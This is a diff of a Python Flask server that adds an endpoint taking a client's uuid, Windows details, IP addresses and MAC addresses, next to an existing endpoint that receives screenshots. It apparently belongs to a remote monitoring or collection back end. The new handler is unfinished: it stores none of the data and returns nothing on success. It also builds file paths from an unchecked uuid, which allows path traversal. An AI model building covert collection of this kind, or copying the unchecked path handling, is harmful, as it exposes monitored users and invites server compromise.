@@ -154,6 +154,28 @@ def receive_screenshot():
         return jsonify({'success': True}), 200
     except Exception as e:
         return jsonify({'error': str(e)}), 500
+    
+@app.route('/api/getbasicinformation', methods=['POST'])
+def getbasicinformation():
+    try:
+        data = request.json
+        uuid = data.get('uuid')
+        windows_information = data.get('windows_info')
+        ip_addresses = data.get('ip_addresses')
+        mac_addresses = data.get('mac_addresses')
+
+        SCREENSHOT_FOLDER = 'data'
+        os.makedirs(SCREENSHOT_FOLDER, exist_ok=True)
+        uuid_folder = os.path.join(SCREENSHOT_FOLDER, uuid)
+        os.makedirs(uuid_folder, exist_ok=True)
+
+        screenshots_folder = os.path.join(uuid_folder, 'BasicInformation')
+        os.makedirs(screenshots_folder, exist_ok=True)
+
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+
 
     
 
